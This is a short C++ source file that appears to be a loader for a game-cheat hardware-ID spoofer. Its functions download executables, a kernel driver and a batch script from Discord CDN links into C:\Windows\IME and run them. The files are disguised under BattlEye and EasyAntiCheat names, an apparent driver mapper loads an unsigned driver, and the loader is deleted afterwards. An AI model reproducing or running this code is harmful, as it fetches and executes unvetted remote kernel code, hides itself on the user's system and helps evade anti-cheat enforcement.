#include <Windows.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <windows.h>
#pragma comment(lib, "urlmon.lib")

void driver() {
	_mkdir("C:\\Windows\\IME\\BEServices");
	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/1040980404401877083/1044596517828300800/sc.exe", "C:\\Windows\\IME\\BEServices\\BattlEye.exe", 0, 0);
	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/1040980404401877083/1044596503383130112/DamageDriver.sys", "C:\\Windows\\IME\\BEServices\\driver.sys", 0, 0);
	system(_("cd C:\\Windows\\IME\\BEServices\\"));
	system(_("C:\\Windows\\IME\\BEServices\\BattlEye.exe C:\\Windows\\IME\\BEServices\\driver.sys"));
	system(_("del C:\\Windows\\IME\\BEServices\\BattlEye.exe"));
}

void spoofer() {
	_mkdir("C:\\Windows\\IME\\EACServices");
	//URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/1040980404401877083/1043933882631856200/Working_BE.sys", "C:\\Windows\\IME\\EACServices\\EACServices.sys", 0, 0);
	//URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/1039309662874517565/1040654207038009375/kdmapper1.exe", "C:\\Windows\\IME\\EACServices\\EAC.exe", 0, 0);
	system(_("cd C:\\Windows\\IME\\EACServices\\"));
	system(_("C:\\Windows\\IME\\EACServices\\EAC.exe C:\\Windows\\IME\\EACServices\\EACServices.sys"));
	system(_("del C:\\Windows\\IME\\EACServices\\EAC.exe"));
}

void check() {
	_mkdir("C:\\Windows\\IME\\Check");
	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/1039309662874517565/1040639173125742653/HWIDCheck.bat", "C:\\Windows\\IME\\Check\\Serials.bat", 0, 0);
	system(_("cd C:\\Windows\\IME\\Check\\"));
	system(_("C:\\Windows\\IME\\Check\\Serials.bat"));
}
